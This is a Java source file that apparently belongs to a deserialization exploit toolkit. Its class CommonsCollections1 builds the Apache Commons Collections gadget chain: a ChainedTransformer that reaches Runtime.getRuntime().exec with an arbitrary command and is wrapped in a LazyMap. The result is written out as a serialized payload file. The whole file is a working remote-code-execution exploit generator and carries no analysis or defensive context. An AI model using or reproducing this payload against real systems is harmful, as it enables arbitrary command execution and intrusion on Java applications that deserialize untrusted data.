package com.exp.collections;


import com.constant.PayloadGenerator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections1 extends PayloadGenerator {
    @Override
    public File generatorPayload(String[] cmd) {
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{cmd})});
        Map<Object, Object> innerMap = new HashMap();
        Map targetMap = LazyMap.decorate(innerMap, chainedTransformer);
        return getFile(targetMap);
    }

}